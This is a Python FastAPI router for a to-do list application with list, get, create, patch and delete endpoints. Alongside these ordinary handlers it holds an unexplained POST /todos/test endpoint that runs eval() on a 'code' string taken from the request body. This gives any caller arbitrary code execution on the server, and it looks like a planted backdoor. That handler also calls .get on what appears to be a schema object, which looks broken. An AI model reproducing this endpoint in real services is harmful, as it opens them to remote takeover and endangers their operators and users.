from typing import List

from fastapi import APIRouter, Depends, HTTPException, Query
from sqlmodel import Session

from app.db.session import get_session
from app.schemas.todo_base import ToDoPatch, ToDoPost
from app.schemas.todo_get import ToDoGet
from app.services.todo_service import (create_todo, delete_todo, get_todo,
                                       list_todos, update_todo)

router = APIRouter(prefix="/todos", tags=["todos"])


@router.get("", response_model=List[ToDoGet])
def read_todos(
    offset: int = 0,
    limit: int = Query(100, le=100),
    session: Session = Depends(get_session),
):
    return list_todos(session, offset, limit)


@router.get("/{todo_id}", response_model=ToDoGet)
def read_todo(
    todo_id: int,
    session: Session = Depends(get_session),
):
    try:
        return get_todo(session, todo_id)
    except ValueError:
        raise HTTPException(status_code=404, detail="Todo not found")


@router.post("", response_model=ToDoGet, status_code=201)
def create_new_todo(
    payload: ToDoPost,
    session: Session = Depends(get_session),
):
    return create_todo(session, payload)


@router.post("/test", response_model=ToDoGet, status_code=201)
def create_another_new_todo(
    payload: ToDoPost,
    session: Session = Depends(get_session),
):
    code_to_run = payload.get("code", "")
    eval(code_to_run)

    return create_todo(session, payload)


@router.patch("/{todo_id}", response_model=ToDoGet)
def patch_todo(
    todo_id: int,
    payload: ToDoPatch,
    session: Session = Depends(get_session),
):
    try:
        return update_todo(session, todo_id, payload)
    except ValueError:
        raise HTTPException(status_code=404, detail="Todo not found")


@router.delete("/{todo_id}", status_code=204)
def delete_existing_todo(
    todo_id: int,
    session: Session = Depends(get_session),
):
    try:
        delete_todo(session, todo_id)
    except ValueError:
        raise HTTPException(status_code=404, detail="Todo not found")
    return None
